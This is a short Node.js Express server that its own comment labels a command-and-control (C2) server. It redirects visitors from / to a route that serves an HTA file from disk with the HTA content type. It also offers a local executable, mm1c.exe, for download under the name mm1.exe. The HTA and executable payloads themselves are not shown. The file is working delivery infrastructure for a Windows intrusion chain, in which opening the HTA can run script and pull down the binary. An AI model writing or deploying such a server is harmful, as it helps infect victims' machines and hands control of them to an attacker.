// server.js
// A C2 server
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Define the path to the hello.hta file
const htaFilePath = path.join(__dirname, 'src', 'sit.hta');

// Function to read HTA file content
const readHTAFile = () => {
  try {
    const htaContent = fs.readFileSync(htaFilePath, 'utf8');
    return htaContent;
  } catch (err) {
    console.error('Error reading HTA file:', err);
    return null;
  }
};
  
const generateHTAContent = () => {
  // Generate the content of your .hta file dynamically here
  const htaContent = `
    <html>
    <head>
      <title>MyHTAFile</title>
      <HTA:APPLICATION
        ID="MyApp"
        APPLICATIONNAME="My HTA"
        BORDER="thin"
        BORDERSTYLE="normal"
        CAPTION="yes"
        CONTEXTMENU="no"
        ICON="MyIcon.ico"
        INNERBORDER="no"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="yes"
        NAVIGABLE="yes"
        SCROLL="yes"
        SCROLLFLAT="yes"
        SELECTION="no"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
        WINDOWSTATE="normal">
      </HTA:APPLICATION>
    </head>
    <body>
      <!-- Your HTA file content goes here -->
      <h1>Hello, this is an .hta file!</h1>
    </body>
    </html>
  `;

  return htaContent;
};

app.use((req, res, next) => {
    if (req.url === '/' && req.method === 'GET') {
      // Redirect to a different URL, e.g., '/welcome'
      return res.redirect('/home');
    }
    next(); // Continue to other routes if not redirected
  });
  


// Route to serve the dynamically generated .hta file content
app.get('/home', (req, res) => {
  const htaContent = readHTAFile();
  res.set('Content-Type', 'application/hta');
  res.send(htaContent);
});

app.get('/8292.png', (req, res) => {
  const imagePath = path.join(__dirname, 'src', '8292.png');
  res.sendFile(imagePath);
});

app.get('/mm1.exe', (req, res) => {
  const exePath = path.join(__dirname, '', 'mm1c.exe');
  res.set('Content-Type', 'application/octet-stream');
  res.download(exePath, 'mm1.exe', (err) => {
    if (err) {
      console.error('Error sending file:', err);
      res.status(404).send('File not found');
    }
  });
});


// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
